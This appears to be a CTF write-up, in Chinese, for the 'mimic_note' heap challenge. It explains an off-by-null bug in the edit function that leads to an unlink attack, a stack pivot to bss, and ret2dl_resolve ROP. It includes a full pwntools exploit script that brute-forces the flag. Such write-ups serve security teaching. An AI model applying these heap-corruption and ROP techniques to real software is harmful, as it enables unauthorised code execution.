[中文](./README_zh.md) [English](./README.md)

[附件](./attachment.zip)

题目给了两个二进制文件，一个是32位的，一个是64位的

主要思想是，给定相同的输入，判断32位和64位程序的输入是否相同，假如不相同就直接退出

题目是一个比较简单的堆题

我们首先来看下main函数

![](img/t1.png)

可以看到有4个功能

1. new
2. delete
3. show
4. edit

其中edit存在一个off by null的漏洞，利用这个漏洞可以unlink，获取任意写

在任意写之后，可以利用一个gadget，将栈转移到bss段上面，进行ROP，这个时候利用ret2dl_resolve就可以打开flag，写到某个note那里，那个note提前设好一个值，假如不相当的话，就会输出what are you trying to do?

下面是exp

这个是预期解，不过因为mimic写得不是很好，有挺多非预期的........

```
from pwn import *
import roputils 


def brute_flag(idx,v):
    debug=1

    #context.log_level='debug'

    rop=roputils.ROP('./mimic_note_32')

    if debug:
        p=process('./mimic')
        #p=process('./mimic_note_32')
        #p=process('./mimic_note_64')
        #gdb.attach(p)
    else:
        #p=remote('127.0.0.1',9999)
        pass

    def ru(x):
        return p.recvuntil(x)

    def se(x):
        p.send(x)

    def sl(x):
        p.sendline(x)


    def new(sz):
        sl('1')
        ru('size?')
        sl(str(sz))
        ru(">> ")

    def delete(idx):
        sl('2')
        ru('index ?')
        sl(str(idx))
        ru(">> ")

    def show(idx):
        sl('3')
        ru('index ?')
        sl(str(idx))

    def edit(idx,content):
        sl('4')
        ru('index ?')
        sl(str(idx))
        ru('content?\n')
        se(content)
        ru(">> ")

    #unlink attack x86

    new(0x68)
    new(0x68)
    new(0x94)
    new(0xf8)


    fake_chunk = p32(0)+p32(0x91)+p32(0x804a070-0xc)+p32(0x804a070-0x8)
    fake_chunk = fake_chunk.ljust(0x90,'\0')

    edit(2,fake_chunk+p32(0x90))

    delete(3)

    #ret2dlresolve and blind injection

    new(0x200)

    bss = 0x0804a500

    edit(2,p32(0x100)+p32(0x804A014)+p32(0x98)+p32(bss+0x300)+p32(0x94)+p32(bss)+p32(0x200))
    edit(1,p32(0x80489FA))

    payload = p32(bss-0x100)+rop.dl_resolve_call(bss+0x60, bss+0x180,0)
    payload += p32(0x8048460)+p32(0x80489F9)+p32(3)+p32(bss+0x300-idx)+p32(idx+1)
    payload += p32(0x080489FB)+p32(bss-0x100)
    payload += p32(0x804893C)

    payload = payload.ljust(0x60,'\x00')
    payload += rop.dl_resolve_data(bss+0x60, 'open')
    payload = payload.ljust(0x180,'\x00')
    payload += 'flag'

    edit(3,payload)

    edit(2,v+'\0')


    sl('2\x00'+'a'*6+p32(0x80488DE))
    ru('index ?\n')
    sl('3\x00')
    ru('>> ')

    show(2)

    ru('\n')
    data = ru('\n') 

    p.close()

    if len(data)>5:
        return False
    return True


charset ='{}_'+ string.ascii_letters + string.digits + string.punctuation

flag = ''
for i in range(40):
    for q in charset:
        if brute_flag(i,q):
            flag+=q
            print(flag)
            if q == '}':
                exit(0)
            break
```
